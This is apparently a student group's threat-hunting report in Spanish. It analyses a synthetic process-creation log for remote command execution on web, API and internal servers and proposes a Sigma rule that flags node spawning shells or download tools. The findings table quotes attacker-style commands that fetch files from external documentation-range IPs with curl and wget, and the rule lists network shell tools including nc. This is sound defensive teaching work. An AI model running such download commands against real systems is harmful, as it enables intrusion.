# Detección y caza — Grupo 02

**Integrantes:** Eliseche, Martín (MartinEliseche); Petosa Ayala, Franco (FrancoPetosa99); Gutierrez Mora, Agustín (agugutierrezz); Bresciani, Isabella (IsabellaBresciani); Kalpin, Sofía (Sokalpin) · **Fecha:** miércoles 28/10/2026

---

## 1. Hipótesis de caza

> Si PHP2Shell o Node2Shell fueron explotados en nuestros servidores, esperamos ver
> a un proceso de servicio (`apache2`, `node` o `python`) como **padre** de un shell
> o de una herramienta de descarga (`sh`, `bash`, `curl`, `wget`, `nc`), a partir del
> 21/10 (divulgación; MadPot ya vio un intento el 17/10). La evidencia esperada son
> comandos cortos de reconocimiento (`id`, `uname`, `whoami`) o descargas a IPs
> externas, en pocos minutos y en varios hosts a la vez.

**Por qué esta hipótesis:** un servidor web, una API o un servicio interno no tiene
motivo legítimo para lanzar un shell o bajar archivos. Si lo hace, lo más probable es
que alguien esté ejecutando comandos a través de una RCE.

---

## 2. Hallazgos en `audit.log`

El log tiene 21 líneas del 27/10/2026, entre 09:40:01 y 09:49:00 UTC, con 4 hosts:
`web01`, `api01`, `svc01` y `db01`. Es un log **sintético** de la cátedra: no refleja
lo que pasó en nuestros contenedores.

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|:-:|---|
| 6–7 · 09:42:17 | web01 | `apache2` → `sh -c id` → `id` | **Sí** | El servidor web lanza un shell. `id` es el primer comando típico tras una RCE ("¿quién soy?"). Consistente con PHP2Shell |
| 9–10 · 09:43:03 | api01 | `node` → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | Node lanza un shell para descargar algo (posible segunda etapa). Consistente con Node2Shell |
| 14 · 09:44:22 | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Descarga directa, **sin shell en el medio**. Segundo evento en web01 |
| 16–17 · 09:45:10 | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio interno: posible pivote desde la API |
| 8, 13, 21 · 09:42:40, 09:44:10, 09:49:00 | db01 | `sshd` → `bash` | **Indeterminado** | Es lo que genera un login SSH de un administrador. Ver sección 3 |
| 1, 2, 5, 12, 18, 20 | web01 | `apache2` → `apache2` | No | Workers normales de Apache |
| 3, 15, 19 | api01 | `node` → `node` | No | El mismo binario que se relanza (workers o reinicios) |
| 4, 11 | svc01 | `python` → `python` | No | Ídem |

**Secuencia:** 09:42 reconocimiento en web01 → 09:43 descarga en api01 → 09:44 descarga
en web01 → 09:45 reconocimiento en svc01. Tres hosts en tres minutos, con comandos
cortos. Eso refuerza la hipótesis de actividad coordinada y no de un hecho aislado.

**Dos detalles sobre cómo se lee el log:**

1. `detectar.sh` filtra por *padre = servidor* y *hijo = shell o herramienta*. Por eso
   muestra solo hijos directos (líneas 6, 9, 14 y 16) y **no** los nietos de las
   líneas 7, 10 y 17 (`sh` → `id`, `sh` → `curl`, `sh` → `uname`), porque su padre es
   `sh`. Una regla que mira solo padre → hijo directo pierde lo que pasa después.
2. La línea 14 no tiene shell. Una regla que busque solamente "servidor lanza `sh` o
   `bash`" **no la detecta**. Por eso la regla tiene que incluir también `curl`,
   `wget` y `nc` como hijos.

**¿Hay compromiso?** **Indicios fuertes de ejecución remota de comandos en web01,
api01 y svc01. Compromiso probable, pero no confirmado.**

- **Qué lo sostiene:** tres servidores distintos lanzan shells o herramientas de red
  que no deberían lanzar, en una ventana de pocos minutos.
- **Por qué no decimos "confirmado":** el log muestra que `curl` y `wget` se
  **lanzaron**, no si la descarga funcionó. Tampoco hay usuario, IP de origen ni el
  request HTTP que originó el comando.
- **Por qué no decimos "no hay compromiso":** un servidor web que ejecuta `id` y
  `wget` no tiene una explicación legítima razonable.

Las IPs `198.51.100.x` pertenecen a un rango reservado para documentación (TEST-NET-2),
lo que confirma que el log es didáctico. En un caso real serían indicadores de
compromiso para bloquear y buscar en otros logs.

---

## 3. Falsos positivos

**db01: `sshd` → `bash` (líneas 8, 13 y 21).** Parece sospechoso porque aparece un
`bash`, pero es exactamente lo que ocurre cuando un administrador entra por SSH. No se
puede afirmar nada sin más datos.

**Cómo lo distinguiríamos:**

- Cruzarlo con `auth.log`: usuario, IP de origen y método de autenticación.
- Verificar si ese horario coincide con una guardia o un cambio planificado.
- Comprobar si la IP de origen es la habitual de administración.

**Matiz:** hay tres sesiones en siete minutos y la primera (09:42:40) ocurre justo
después del evento de web01 (09:42:17). La coincidencia de horario no alcanza para
vincularlas, pero tampoco permite descartarlas. Lo dejamos como **indeterminado**.

**Otro posible falso positivo:** los `node` → `node` y `python` → `python` repetidos
podrían ser reinicios de los servicios. Conviene confirmar por qué se relanzan.

---

## 4. Regla propuesta para Node.js

**Qué observa:** eventos de creación de procesos (auditd, Sysmon for Linux o un EDR).

**Condición:** el proceso padre es `node` **y** el proceso hijo es `sh`, `bash`, `dash`,
`curl`, `wget` o `nc`. **Severidad alta** en hosts de API, que no deberían lanzar shells.

```yaml
title: Proceso node lanza shell o herramienta de descarga
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/node'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/curl'
      - '/wget'
      - '/nc'
  condition: selection
level: high
```

**Prueba contra nuestro log** (el log trae nombres de proceso, no rutas completas):

```bash
grep -E 'ppid_comm=node ' laboratorio/logs/audit.log | grep -E ' comm=(sh|bash|dash|curl|wget|nc) '
```

Devuelve una sola línea: la 9 (`api01`, 09:43:03, `sh -c curl http://198.51.100.7/x`).

**Falsos positivos:** aplicaciones que usan `child_process.exec()` de forma legítima
(generar PDFs, llamar a `git`, etc.). Se manejan con una lista de excepciones por host
o por comando.

**Falsos negativos:**

- Un reverse shell hecho en JavaScript puro, sin crear procesos hijos.
- Binarios renombrados (por ejemplo `/tmp/x` en lugar de `curl`).
- Otros intérpretes lanzados desde `node` (`python3`, `perl`).
- Una regla que mira solo padre → hijo directo no ve a los nietos si el primer hijo
  no está en la lista.
- Hosts sin auditoría de procesos: sin telemetría, la regla no se dispara.

**Mejoras posibles:** seguir la cadena completa de procesos (padre → hijo → nieto),
alertar sobre hijos nunca vistos en ese host, comparar hashes de binarios y combinar
la regla con alertas de conexiones salientes.

**Sobre la regla SIGMA de CISA:** no está en el repo y no la usamos. La regla de arriba
es propia. Conceptualmente, la de PHP observa lo mismo con `apache2`, `php-fpm` o
`httpd` como padre.

---

## 5. Limitaciones del log

- **No hay usuario** que ejecutó cada proceso.
- **No hay IP de origen** ni el request HTTP que disparó el comando.
- **No hay resultado:** no sabemos si `curl` o `wget` descargaron algo o fallaron.
- **No hay conexiones de red.**
- **Una sola fuente:** no se puede correlacionar con logs de Apache, del proxy o del
  firewall.
- **Retención de unos 9 minutos** (09:40 a 09:49): no cubre desde el 17/10, que es la
  ventana que habría que revisar.
- **No hay hash del binario:** un binario renombrado pasa desapercibido.
- **Es un log sintético:** no refleja lo que pasó en nuestros contenedores, y no
  pudimos cruzarlo con `auth.log` ni con ninguna otra fuente.